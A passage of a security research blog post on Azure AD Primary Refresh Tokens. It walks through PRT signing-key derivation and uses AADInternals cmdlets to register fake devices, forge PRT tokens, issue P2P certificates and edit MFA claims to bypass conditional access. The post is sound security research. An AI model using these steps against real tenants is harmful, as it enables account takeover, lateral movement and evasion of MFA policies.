<p>Both the header and body are separately encoded (Byte 64), the padding is removed, and they are concatenated using a period &lsquo;.&rsquo; as a separator.
The result is turned into a byte array (UTF-8 encoding) and signed.</p>

<p>The key used to sign the JWT is derived from the session key and context, as explained by <a href="https://dirkjanm.io/digging-further-into-the-primary-refresh-token/" target="_blank">@_dirkjan</a>.
He used <strong>BCryptKeyDerivation</strong> to derive the key. The key derivation is using <a href="https://csrc.nist.gov/publications/detail/sp/800-108/final" target="_blank">NIST SP 800-108 KDF</a> key derivation function,
which I already knew from <a href="/aadinternals/#export-aadintadfssigningcertificate" target="_blank">Export-AADIntADFSSigningCertificate</a>.</p>

<p>As the signature is 256 bit (32 bytes) long, deriving the key was a walk in the park (wearing :mask:).</p>

<p>The key is derived by calculating a HMACSHA256 value from the following byte array using the session key as the secret:</p>

<pre><code>0x00, 0x00, 0x00, 0x01, &lt;label&gt;, 0x00, &lt;context&gt;, &lt;length&gt;
</code></pre>

<p>The parameters used are explained below.</p>

<p><strong>Note!</strong> The &ldquo;AzureAD-SecureConversation&rdquo; is a fixed label.</p>

<table>
<thead>
<tr>
<th>Parameter</th>
<th>Description</th>
<th>Value</th>
<th>Bytes</th>
</tr>
</thead>

<tbody>
<tr>
<td>label</td>
<td>UTF8 encoded byte array of the key label.</td>
<td>&ldquo;AzureAD-SecureConversation&rdquo;</td>
<td>0x41, 0x7A, 0x75, 0x72, 0x65, 0x41, 0x44, 0x2D, 0x53, 0x65, 0x63, 0x75, 0x72, 0x65, 0x43, 0x6F, 0x6E, 0x76, 0x65, 0x72, 0x73, 0x61, 0x74, 0x69, 0x6F, 0x6E</td>
</tr>

<tr>
<td>context</td>
<td>UTF8 encoded byte array of the context.</td>
<td>&ldquo;x9XSurmy8TmcsJUgxq/IT5TJg73fgiKj&rdquo;</td>
<td>0xC7, 0xD5, 0xD2, 0xBA, 0xB9, 0xB2, 0xF1, 0x39, 0x9C, 0xB0, 0x95, 0x20, 0xC6, 0xAF, 0xC8, 0x4F, 0x94, 0xC9, 0x83, 0xBD, 0xDF, 0x82, 0x22, 0xA3</td>
</tr>

<tr>
<td>length</td>
<td>32 bit integer, length of the key in bits.</td>
<td>256</td>
<td>0x00, 0x00, 0x01, 0x00</td>
</tr>
</tbody>
</table>

<p>The final byte array from where the HMACSHA256 is calculated:</p>

<pre><code>           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F

00000000   00 00 00 01 41 7A 75 72 65 41 44 2D 53 65 63 75  ....AzureAD-Secu
00000010   72 65 43 6F 6E 76 65 72 73 61 74 69 6F 6E 00 C7  reConversation.Ç
00000020   D5 D2 BA B9 B2 F1 39 9C B0 95 20 C6 AF C8 4F 94  ÕÒº¹²ñ9° Æ¯ÈO
00000030   C9 83 BD DF 82 22 A3 00 00 01 00                 É½ß&quot;£....  
</code></pre>

<p>After calculating the HMACSHA256, the resulting byte array can be used to sign the JWT.
The base 64 encoded signature (padding removed) is appended to the end of header and body using the period &lsquo;.&rsquo; as the separator.</p>

<h1 id="creating-your-own-prt">Creating your own PRT</h1>

<p>One interesting thing in the cloud-era is that everything you do with the devices or clients involves communication with the cloud. This is also the case with PRT.</p>

<p>As explained in the <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/hello-for-business/hello-how-it-works-device-registration#azure-ad-joined-in-managed-environments" target="_blank">documentation</a>,
there are a lot of steps involved in joining a device to Azure AD.</p>

<p>And because I can, I decided to implement the registration process to AADInternals!</p>

<p>The first step is to get an access token for appid <strong>1b730954-1685-4b74-9bfd-dac224a7b894</strong> with <strong>01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9</strong> audience.
The following command will prompt for credentials and MFA:
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Get an access token for AAD join and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForAADJoin</span> <span class="n">-SaveToCache</span></code></pre></div></p>

<p>Now we can join our imaginary device to Azure AD:
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Join the device to Azure AD</span>
<span class="nb">Join-AADIntDeviceToAzureAD</span> <span class="n">-DeviceName</span> <span class="s2">&#34;My computer&#34;</span> <span class="n">-DeviceType</span> <span class="s2">&#34;Commodore&#34;</span> <span class="n">-OSVersion</span> <span class="s2">&#34;C64&#34;</span></code></pre></div>
Output should be similar to below. The device is now registered and the corresponding certificate
is saved to the current directory.</p>

<pre><code>Device successfully registered to Azure AD:
  DisplayName:     &quot;My computer&quot;
  DeviceId:        d03994c9-24f8-41ba-a156-1805998d6dc7
  Cert thumbprint: 78CC77315A100089CF794EE49670552485DE3689
  Cert file name : &quot;d03994c9-24f8-41ba-a156-1805998d6dc7.pfx&quot;
Local SID:
  S-1-5-32-544
Additional SIDs:
  S-1-12-1-797902961-1250002609-2090226073-616445738
  S-1-12-1-3408697635-1121971140-3092833713-2344201430
  S-1-12-1-2007802275-1256657308-2098244751-2635987013
</code></pre>

<p>The whole process is as follows.</p>

<ol>
<li>A new RSA key pair is generated for the device (dkpub/dkpriv).</li>
<li>A certificate signing request (CSR) is generated for the name &ldquo;CN=7E980AD9-B86D-4306-9425-9AC066FB014A&rdquo;</li>
<li>A http request is made to &ldquo;<a href="https://enterpriseregistration.windows.net/EnrollmentServer/device/?api-version=1.0&quot;">https://enterpriseregistration.windows.net/EnrollmentServer/device/?api-version=1.0&quot;</a> to register the device to Azure AD</li>
</ol>

<p>The request body sent to Azure AD:
<div class="highlight"><pre class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
	<span class="nt">&#34;CertificateRequest&#34;</span><span class="p">:</span> <span class="p">{</span>
		<span class="nt">&#34;Type&#34;</span><span class="p">:</span> <span class="s2">&#34;pkcs10&#34;</span><span class="p">,</span>
		<span class="nt">&#34;Data&#34;</span><span class="p">:</span> <span class="s2">&#34;MIICdDCCAVwCAQAwLzEt...BAqsCDnqheld6IIgBC4GueLq+hrmu/7KjiHPQ=&#34;</span>
	<span class="p">},</span>
	<span class="nt">&#34;TransportKey&#34;</span><span class="p">:</span>      <span class="s2">&#34;UlNBMQAIAAADAAAAAAEAAAAAAAAAAA...1EqIHM2S/iUkPtr5vNmKKa7zTQeWtRCSzzbZUfE0C3RQ==&#34;</span><span class="p">,</span>
	<span class="nt">&#34;TargetDomain&#34;</span><span class="p">:</span>      <span class="s2">&#34;contoso.com&#34;</span><span class="p">,</span>
	<span class="nt">&#34;DeviceType&#34;</span><span class="p">:</span>        <span class="s2">&#34;Commodore&#34;</span><span class="p">,</span>
	<span class="nt">&#34;OSVersion&#34;</span><span class="p">:</span>         <span class="s2">&#34;C64&#34;</span><span class="p">,</span>
	<span class="nt">&#34;DeviceDisplayName&#34;</span><span class="p">:</span> <span class="s2">&#34;My computer&#34;</span><span class="p">,</span>
	<span class="nt">&#34;JoinType&#34;</span><span class="p">:</span>           <span class="mi">0</span><span class="p">,</span>
	<span class="nt">&#34;attributes&#34;</span><span class="p">:</span> <span class="p">{</span>
		<span class="nt">&#34;ReuseDevice&#34;</span><span class="p">:</span>     <span class="s2">&#34;true&#34;</span><span class="p">,</span>
		<span class="nt">&#34;ReturnClientSid&#34;</span><span class="p">:</span> <span class="s2">&#34;true&#34;</span>
	<span class="p">}</span>
<span class="p">}</span></code></pre></div></p>

<table>
<thead>
<tr>
<th>Attribute</th>
<th>Description</th>
</tr>
</thead>

<tbody>
<tr>
<td>CertificateRequest\Data</td>
<td>The base 64 encoded CSR (dkpub)</td>
</tr>

<tr>
<td>TransportKey</td>
<td>The base 64 encoded raw public key of the transport key (tkpub). <br><br><strong>Note!</strong> AADInternals uses the device certificate&rsquo;s private key to make things easier.</td>
</tr>

<tr>
<td>TargetDomain</td>
<td>UPN suffix of the user</td>
</tr>

<tr>
<td>DeviceDisplayName</td>
<td>The display name of the device.</td>
</tr>

<tr>
<td>DeviceType</td>
<td>A string describing the type of the device. Usually something like &ldquo;Windows&rdquo; or &ldquo;Android&rdquo;.</td>
</tr>

<tr>
<td>OSVersion</td>
<td>A string describing the OS version of the device. Usually something like &ldquo;10.0.18363.0&rdquo; or &ldquo;8.1.0&rdquo;</td>
</tr>

<tr>
<td>JoinType</td>
<td>Type of the Azure AD Join. 0=AAD Join, 4=AAD register</td>
</tr>
</tbody>
</table>

<p>The return value contains the signed public certificate of the device (dkpub) and its thumb print:
<div class="highlight"><pre class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
	<span class="nt">&#34;Certificate&#34;</span><span class="p">:</span> <span class="p">{</span>
		<span class="nt">&#34;Thumbprint&#34;</span><span class="p">:</span> <span class="s2">&#34;78CC77315A100089CF794EE49670552485DE3689&#34;</span><span class="p">,</span>
		<span class="nt">&#34;RawBody&#34;</span><span class="p">:</span> <span class="s2">&#34;MIID8jCCAtqgAwIBAgIQ...ceSgJZ7PGsxXF93b7yJ2zBlKFUJp7yMTm0esNaM/yDQpZ29SB4BMgtPJghsMUzyDSUQEIS8zc00ozZd2HQ8s+&#34;</span>
	<span class="p">},</span>
	<span class="nt">&#34;User&#34;</span><span class="p">:</span> <span class="p">{</span>
		<span class="nt">&#34;Upn&#34;</span><span class="p">:</span> <span class="s2">&#34;TestU@contoso.com&#34;</span>
	<span class="p">},</span>
	<span class="nt">&#34;MembershipChanges&#34;</span><span class="p">:</span> <span class="p">[{</span>
			<span class="nt">&#34;LocalSID&#34;</span><span class="p">:</span> <span class="s2">&#34;S-1-5-32-544&#34;</span><span class="p">,</span>
			<span class="nt">&#34;AddSIDs&#34;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&#34;S-1-12-1-797902961-1250002609-2090226073-616445738&#34;</span><span class="p">,</span> <span class="s2">&#34;S-1-12-1-3408697635-1121971140-3092833713-2344201430&#34;</span><span class="p">,</span> <span class="s2">&#34;S-1-12-1-2007802275-1256657308-2098244751-2635987013&#34;</span><span class="p">]</span>
		<span class="p">}</span>
	<span class="p">]</span>
<span class="p">}</span></code></pre></div></p>

<p>With the newly created device certificate, we can now request a new PRT keys and create PRT tokens!</p>

<p>The following command prompts for user&rsquo;s credentials and requests new PRT and session key from Azure AD.</p>

<p><div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Get the PRT keys using the device certificate</span>
<span class="nv">$prtKeys</span> <span class="p">=</span> <span class="nb">Get-AADIntUserPRTKeys</span> <span class="n">-PfxFileName</span> <span class="p">.\</span><span class="n">d03994c9</span><span class="p">-</span><span class="n">24f8</span><span class="p">-</span><span class="n">41ba-a156</span><span class="p">-</span><span class="n">1805998d6dc7</span><span class="p">.</span><span class="n">pfx</span></code></pre></div>
As the output indicates, the keys are also saved to a JSON file:</p>

<pre><code>Keys saved to d03994c9-24f8-41ba-a156-1805998d6dc7.json
</code></pre>

<p>The return value is similar to the following JSON. The PRT is returned in <strong>refresh_token</strong> and the encrypted session key in <strong>session_key_jwe</strong>.</p>

<div class="highlight"><pre class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
	<span class="nt">&#34;token_type&#34;</span><span class="p">:</span> <span class="s2">&#34;Bearer&#34;</span><span class="p">,</span>
	<span class="nt">&#34;expires_in&#34;</span><span class="p">:</span> <span class="s2">&#34;1209599&#34;</span><span class="p">,</span>
	<span class="nt">&#34;ext_expires_in&#34;</span><span class="p">:</span> <span class="s2">&#34;0&#34;</span><span class="p">,</span>
	<span class="nt">&#34;expires_on&#34;</span><span class="p">:</span> <span class="s2">&#34;1600160796&#34;</span><span class="p">,</span>
	<span class="nt">&#34;refresh_token&#34;</span><span class="p">:</span> <span class="s2">&#34;0.AAAAxkwDRL7_f...TVBYMcAOzoxr076ZU04IS3ON88dljGYUX2BF2a4TyZTyfjMT3diAuufJW_99ITDQ6QvkzZklaGWlsEdysa_oQ85OXPuBkVcBgzTsr_urKXN1j6L1U&#34;</span><span class="p">,</span>
	<span class="nt">&#34;refresh_token_expires_in&#34;</span><span class="p">:</span> <span class="mi">1209599</span><span class="p">,</span>
	<span class="nt">&#34;id_token&#34;</span><span class="p">:</span> <span class="s2">&#34;eyJ0eXAiOiJ...m15bzM2NS5zaXRlIiwidmVyIjoiMS4wIn0.&#34;</span><span class="p">,</span>
	<span class="nt">&#34;session_key_jwe&#34;</span><span class="p">:</span> <span class="s2">&#34;eyJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiUlNBLU9BRVAifQ.CP7m_pNSAtchTvUPOPSA24Al7NgeetJXWqma8maQ19xikVUdVZEUEuJy3LoT6oWHRLsP4_BVmfoux_sNtotlmpHDS9kIGWdGkX-tFN3OuZHV954lCIRwa8WMh035RpfAZyCAwi_hfjz_Jx1y6Z7Q8vEa8EBGDxUN14kag81TsBFONFMHztQmwLhJ89pqoxlmn64sb0ctp2YmYpuATg7pCb3gwdDyiH9JUG3ZAndkkahnch24Wxnx0xPs1gwcKYdGg8gdpjrlsAroWvh2zD8Z6gReKBldt3BiJg3Z7QtUJgQIDg-FHkxyNavdb7OPSUR4nO-4MbA_H_7Dm8pTbKYHVA.MPpemDdwWCf9LSvv.jw.Hl5eNegOGoiYxgTKrxYLcw&#34;</span>
<span class="p">}</span></code></pre></div>

<p>The header of the <strong>sessio_key_jwe</strong> indicates that the key is encrypted using RSA-OAEP algorithm.
<div class="highlight"><pre class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
	<span class="nt">&#34;enc&#34;</span><span class="p">:</span> <span class="s2">&#34;A256GCM&#34;</span><span class="p">,</span>
	<span class="nt">&#34;alg&#34;</span><span class="p">:</span> <span class="s2">&#34;RSA-OAEP&#34;</span>
<span class="p">}</span></code></pre></div></p>

<p>Luckily, this was easy to decrypt in PowerShell:</p>

<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Note: Private key is assumed to be present in $PrivateKey variable</span>

<span class="c"># Get the encrypted key from the session_key_jwe (between the first and second period &#39;.&#39; )</span>
<span class="nv">$JWE</span> <span class="p">=</span> <span class="s2">&#34;eyJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiUlNBLU9BRVAifQ.CP7m_pNSAtchTvU...l5eNegOGoiYxgTKrxYLcw&#34;</span>
<span class="nv">$encKey</span> <span class="p">=</span>  <span class="no">[convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$JWE</span><span class="p">.</span><span class="n">Split</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">)[</span><span class="n">1</span><span class="p">])</span>

<span class="c"># Decrypt the key using the private key of transport key (tkpriv)</span>
<span class="nv">$decKey</span> <span class="p">=</span> <span class="no">[System.Security.Cryptography.RSAOAEPKeyExchangeDeformatter]</span><span class="p">::</span><span class="n">new</span><span class="p">(</span><span class="nv">$PrivateKey</span><span class="p">).</span><span class="n">DecryptKeyExchange</span><span class="p">(</span><span class="nv">$encKey</span><span class="p">)</span></code></pre></div>

<p>AADInternals adds the decrypted session key to <strong>session_key</strong> field of the JSON file before saving/returning it.
As such, we can easily pass the returned <strong>$prtKeys</strong> as settings when creating new PRT tokens:</p>

<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Get the PRT keys using the device certificate</span>
<span class="nv">$prtKeys</span> <span class="p">=</span> <span class="nb">Get-AADIntUserPRTKeys</span> <span class="n">-PfxFileName</span> <span class="p">.\</span><span class="n">d03994c9</span><span class="p">-</span><span class="n">24f8</span><span class="p">-</span><span class="n">41ba-a156</span><span class="p">-</span><span class="n">1805998d6dc7</span><span class="p">.</span><span class="n">pfx</span>

<span class="c"># Generate a new PRTToken using the PRT keys</span>
<span class="nv">$prtToken</span> <span class="p">=</span> <span class="nb">New-AADIntUserPRTToken</span> <span class="n">-Settings</span> <span class="nv">$prtKeys</span> <span class="n">-GetNonce</span>

<span class="c"># Get an access token for AAD Graph API and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForAADGraph</span> <span class="n">-PRTToken</span> <span class="nv">$prtToken</span> <span class="n">-SaveToCache</span></code></pre></div>

<p>We can also use the generated device certificate to get <strong>P2P certificate</strong> for the <strong>device</strong> itself!</p>

<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Get the new P2P device certificate</span>
<span class="nb">New-AADIntP2PDeviceCertificate</span> <span class="n">-PfxFileName</span> <span class="p">.\</span><span class="n">d03994c9</span><span class="p">-</span><span class="n">24f8</span><span class="p">-</span><span class="n">41ba-a156</span><span class="p">-</span><span class="n">1805998d6dc7</span><span class="p">.</span><span class="n">pfx</span> <span class="n">-TenantId</span> <span class="n">4169fee0-df47</span><span class="p">-</span><span class="n">4e31-b1d7</span><span class="p">-</span><span class="n">5d248222b872</span> <span class="n">-DeviceName</span> <span class="s2">&#34;mypc1.company.com&#34;</span></code></pre></div>

<pre><code>Device certificate successfully created:
  Subject:         &quot;CN=d03994c9-24f8-41ba-a156-1805998d6dc7, DC=4169fee0-df47-4e31-b1d7-5d248222b872&quot;
  DnsName:         &quot;mypc1.company.com&quot;
  Issuer:          &quot;CN=MS-Organization-P2P-Access [2020]&quot;
  Cert thumbprint: 84D7641F9BFA90767EA3456E443E21948FC425E5
  Cert file name : &quot;d03994c9-24f8-41ba-a156-1805998d6dc7-P2P.pfx&quot;
  CA file name :   &quot;d03994c9-24f8-41ba-a156-1805998d6dc7-P2P-CA.der&quot;
</code></pre>

<p>The generated certificate can be used with <a href="https://github.com/morRubin/AzureADJoinedMachinePTC" target="_blank">AzureADJoinedMachine</a> by @rubin_mor
to access other Azure AD joined machines.</p>

<h1 id="prt-and-mfa-claims">PRT and MFA claims</h1>

<p>As the <a href="https://docs.microsoft.com/en-us/azure/active-directory/devices/concept-primary-refresh-token#when-does-a-prt-get-an-mfa-claim" target="_blank">documentation</a>
states, the PRT has MFA claim if the PRT was acquired using some form of MFA.</p>

<p>Based on my research, this information is stored to Azure AD device object. And, of course, this can be edited <strong>after</strong> the
device is registered..</p>

<p>You can use any of the following methods from MS access tokens <a href="https://docs.microsoft.com/en-us/azure/active-directory/develop/access-tokens#the-amr-claim" target="_blank">documentation</a>:</p>

<table>
<thead>
<tr>
<th>Value</th>
<th>Description</th>
</tr>
</thead>

<tbody>
<tr>
<td>pwd</td>
<td>Password authentication, either a user&rsquo;s Microsoft password or an app&rsquo;s client secret.</td>
</tr>

<tr>
<td>rsa</td>
<td>Authentication was based on the proof of an RSA key, for example with the Microsoft Authenticator app. This includes if authentication was done by a self-signed JWT with a service owned X509 certificate.</td>
</tr>

<tr>
<td>otp</td>
<td>One-time passcode using an email or a text message.</td>
</tr>

<tr>
<td>fed</td>
<td>A federated authentication assertion (such as JWT or SAML) was used.</td>
</tr>

<tr>
<td>wia</td>
<td>Windows Integrated Authentication</td>
</tr>

<tr>
<td>mfa</td>
<td>Multi-factor authentication was used. When this is present the other authentication methods will also be included.</td>
</tr>

<tr>
<td>ngcmfa</td>
<td>Equivalent to mfa, used for provisioning of certain advanced credential types.</td>
</tr>

<tr>
<td>wiaormfa</td>
<td>The user used Windows or an MFA credential to authenticate.</td>
</tr>

<tr>
<td>none</td>
<td>No authentication was done.</td>
</tr>
</tbody>
</table>

<p>To see the methods of the device, use the following commands:
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Get access token </span>
<span class="nb">Get-AADIntAccessTokenForAADGraph</span> <span class="n">-SaveToCache</span>

<span class="c"># Get the authentication methods</span>
<span class="nb">Get-AADIntDeviceRegAuthMethods</span> <span class="n">-DeviceId</span> <span class="s2">&#34;d03994c9-24f8-41ba-a156-1805998d6dc7&#34;</span></code></pre></div></p>

<pre><code>pwd
</code></pre>

<p>The output will be the list of all authentication methods used while registering the device. In the example above,
the device was registered using password authentication method.</p>

<p>However, if you are a Global Admin, you can edit this :ok_hand: The example below sets password, device certificate and MFA authentication methods for the device.</p>

<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Set the authentication methods</span>
<span class="nb">Set-AADIntDeviceRegAuthMethods</span> <span class="n">-DeviceId</span> <span class="s2">&#34;d03994c9-24f8-41ba-a156-1805998d6dc7&#34;</span> <span class="n">-Methods</span> <span class="n">pwd</span><span class="p">,</span><span class="n">rsa</span><span class="p">,</span><span class="n">mfa</span></code></pre></div>

<pre><code>pwd
rsa
mfa
</code></pre>

<p>Now all the access tokens acquired using the PRT of the device will include pwd, rsa, and mfa claims! This way you can
change the authentication behaviour of devices.</p>

<p><strong>Note:</strong> PRT claims are inherited only if the access token is acquired by the owner of the device!</p>

<h1 id="summary">Summary</h1>

<p>The PRT tokens can be easily created with Windows components for the current user. But the two main incredients,
the session key and the PRT itself, are much harder to get access to.
With Mimikatz, however, these can be exported (at least from the machine without TPM)</p>

<p>We also learned how easy it is to &ldquo;create&rdquo; your own devices, register them to Azure AD, and get access to device certificates.
With those certificates, we were able to create a new PRT with the corresponding session token.</p>

<p>After getting access to session key and PRT, we were able to create our own PRT tokens, and with them get access tokens to Azure AD / Office 365 services.
Also, we were able to create P2P Azure AD device and user certificates, which could be used to laterally access other
Azure AD joined computers of the same tenant.</p>

<p>By joining our own &ldquo;devices&rdquo; to Azure AD and acquiring PRT tokens for those devices, it is possible to &ldquo;emulate&rdquo; corporate computers and bypass
certain conditional access (CA) policies based on the device state.</p>

<h1 id="what-next">What next?</h1>

<p>Next I&rsquo;ll continue to explore Azure MDM and MAM to see whether it would be possible to emulate device compliance. But that&rsquo;s another <a href="/post/mdm" target="_blank">story</a>!</p>

<h1 id="references">References</h1>

<ul>
<li>@_dirkjan: <a href="https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/" target="_blank">Abusing Azure AD SSO with the Primary Refresh Token</a></li>
<li>@_dirkjan: <a href="https://dirkjanm.io/digging-further-into-the-primary-refresh-token/" target="_blank">Digging further into the Primary Refresh Token</a></li>
<li>@gentilkiwi: <a href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20200807" target="_blank">Mimikatz release 2.2.0 20200807 Azure Pass-the-PRT</a></li>
<li>@rubin_mor: <a href="https://medium.com/@mor2464/azure-ad-pass-the-certificate-d0c5de624597" target="_blank">Azure AD Pass The Certificate</a></li>
<li>@tifkin_: <a href="https://posts.specterops.io/requesting-azure-ad-request-tokens-on-azure-ad-joined-machines-for-browser-sso-2b0409caad30" target="_blank">Requesting Azure AD Request Tokens on Azure-AD-joined Machines for Browser SSO</a></li>
<li>Microsoft: <a href="https://docs.microsoft.com/en-us/azure/active-directory/devices/concept-primary-refresh-token" target="_blank">What is a Primary Refresh Token?</a></li>
<li>Microsoft: <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/hello-for-business/hello-how-it-works-device-registration" target="_blank">Windows Hello for Business and Device Registration</a></li>
<li>Microsoft: <a href="https://docs.microsoft.com/en-us/azure/active-directory/develop/access-tokens#the-amr-claim" target="_blank">Microsoft identity platform access tokens</a></li>
</ul>
		</div>
		
<div class="post__tags tags clearfix">
	<img class="icon icon-tag" src="/images/tags.png" width="16" height="16" viewBox="0 0 16 16">
	
	<ul class="tags__list">
		<li class="tags__item"><a class="tags__link" href="/tags/azure-active-directory/" rel="tag">Azure Active Directory</a></li>
		<li class="tags__item"><a class="tags__link" href="/tags/azure/" rel="tag">Azure</a></li>
		<li class="tags__item"><a class="tags__link" href="/tags/security/" rel="tag">security</a></li>
		<li class="tags__item"><a class="tags__link" href="/tags/mfa/" rel="tag">MFA</a></li>
		<li class="tags__item"><a class="tags__link" href="/tags/prt/" rel="tag">PRT</a></li>
	</ul>
</div>

		<div class="post__tags tags clearfix">
<ul class="tags__list">
	<li class="tags__item"><a class="tags__link" href="http://twitter.com/intent/tweet?url=http%3a%2f%2fo365blog.com%2fpost%2fprt%2f&text=Journey%20to%20Azure%20AD%20PRT%3a%20Getting%20access%20with%20pass-the-token%20and%20pass-the-cert&tw_p=tweetbutton" title="Share in Twitter" target="_blank" rel="nofollow"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
	<li class="tags__item"><a class="tags__link" href="https://www.linkedin.com/shareArticle?url=http%3a%2f%2fo365blog.com%2fpost%2fprt%2f&mini=true&title=Journey%20to%20Azure%20AD%20PRT%3a%20Getting%20access%20with%20pass-the-token%20and%20pass-the-cert&summary=&source=o365blog.com" title="Share in LinkedIn" target="_blank" rel="nofollow"><i class="fa fa-linkedin" aria-hidden="true"></i></a></li>
</ul>
</div>
	</article>
	
<div class="authorbox clearfix">
	<figure class="authorbox__avatar">
		<img alt="Dr Nestori Syynimaa (@DrAzureAD) avatar" src="/images/nestori.jpg" class="avatar" height="90" width="90">
	</figure>
	<div class="authorbox__header">
		<span class="authorbox__name">About Dr Nestori Syynimaa (@DrAzureAD)</span>
	</div>
	<div class="authorbox__description">
		Dr Syynimaa works as Senior Principal Information Security Researcher at Secureworks CTU (Counter Threat Unit). <br> Before moving to his current position, Dr Syynimaa worked as a CIO, consultant, trainer, and university lecturer for over 20 years. He is a regular speaker in scientific and professional conferences related to Microsoft 365 and Azure AD security. <br><br>Dr Syynimaa is Microsoft Certified Expert (Microsoft 365), Microsoft Certified Azure Solutions Architect Expert, Microsoft Certified Trainer, Microsoft MVP (Enterprise Mobility, Identity and Access &amp; Intune), and Microsoft Most Valuable Security Researcher (MVR).
	</div>
</div>
	
<nav class="post-nav row clearfix" itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement">
	<div class="post-nav__item post-nav__item--prev col-1-2">
		<a class="post-nav__link" href="/post/mfa/" rel="prev"><span class="post-nav__caption">«Previous</span><p class="post-nav__post-title">Deep-dive to Azure AD MFA: Creating a custom authenticator app</p></a>
	</div>
	<div class="post-nav__item post-nav__item--next col-1-2">
		<a class="post-nav__link" href="/post/mdm/" rel="next"><span class="post-nav__caption">Next»</span><p class="post-nav__post-title">Bypassing conditional access by faking device compliance.</p></a>
	</div>
</nav>

	
<div class="comments">
	<div id="disqus_thread"></div>
<script>
    var disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "o365blog-com" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</div>

</main>

<aside class="sidebar" itemscope="itemscope" itemtype="http://schema.org/WPSideBar">
	
<div class="widget-search widget">
	<form class="widget-search__form" role="search" method="get" action="//google.com/search">
		<label>
			<span class="screen-reader-text">Search for:</span>
			<input class="widget-search__field" type="search" placeholder="SEARCH..." value="" name="q">
		</label>
		<input class="widget-search__submit" type="submit" value="Search">
		<input type="hidden" name="sitesearch" value="http://o365blog.com" />
	</form>
</div>
	
<div class="widget-recent widget">
	<h4 class="widget__title">Recent Posts</h4>
	<div class="widget__content">
		<ul class="widget__list">
			<li class="widget__item"><a class="widget__link" href="/post/pta/">Exploiting Azure AD PTA vulnerabilities: Creating backdoor and harvesting credentials</a></li>
			<li class="widget__item"><a class="widget__link" href="/post/gmsa/">Hunt for the gMSA secrets</a></li>
			<li class="widget__item"><a class="widget__link" href="/post/august_2022/">AADInternals World Tour August 2022: USA</a></li>
			<li class="widget__item"><a class="widget__link" href="/post/deviceidentity/">Stealing and faking Azure AD device identities</a></li>
			<li class="widget__item"><a class="widget__link" href="/post/partners/">Microsoft partners: The Good, The Bad, or The Ugly?</a></li>
		</ul>
	</div>
</div>

	
<div class="widget-categories widget">
	<h4 class="widget__title">Categories</h4>
	<div class="widget__content">
		<ul class="widget__list">
			<li class="widget__item"><a class="widget__link" href="/categories/"></a></li>
			<li class="widget__item"><a class="widget__link" href="/categories/article">Article</a></li>
			<li class="widget__item"><a class="widget__link" href="/categories/blog">Blog</a></li>
		</ul>
	</div>
</div>
	
<div class="widget-social widget">
	<h4 class="widget-social__title widget__title">Social</h4>
	<div class="widget-social__content widget__content">
		<div class="widget-social__item widget__item">
			<a class="widget-social__link widget__link btn" title="Twitter" rel="noopener noreferrer" href="https://twitter.com/DrAzureAD" target="_blank">
				<svg class="widget-social__link-icon icon-twitter" viewBox="0 0 384 312" width="24" height="24" xmlns="http://www.w3.org/2000/svg" fill="#fff"><path d="m384 36.9c-14.1 6.3-29.3 10.5-45.2 12.4 16.3-9.7 28.8-25.2 34.6-43.6-15.2 9-32.1 15.6-50 19.1-14.4-15.2-34.9-24.8-57.5-24.8-43.5 0-78.8 35.3-78.8 78.8 0 6.2.7 12.2 2 17.9-65.5-3.3-123.5-34.6-162.4-82.3-6.7 11.6-10.6 25.2-10.6 39.6 0 27.3 13.9 51.4 35 65.6-12.9-.4-25.1-4-35.7-9.9v1c0 38.2 27.2 70 63.2 77.2-6.6 1.8-13.6 2.8-20.8 2.8-5.1 0-10-.5-14.8-1.4 10 31.3 39.1 54.1 73.6 54.7-27 21.1-60.9 33.7-97.8 33.7-6.4 0-12.6-.4-18.8-1.1 34.9 22.4 76.3 35.4 120.8 35.4 144.9 0 224.1-120 224.1-224.1 0-3.4-.1-6.8-.2-10.2 15.4-11.1 28.7-25 39.3-40.8z"/></svg>
				<span>Twitter</span>
			</a>
		</div>
		<div class="widget-social__item widget__item">
			<a class="widget-social__link widget__link btn" title="" rel="noopener noreferrer" href="https://linkedin.com/in/nestori" target="_blank">
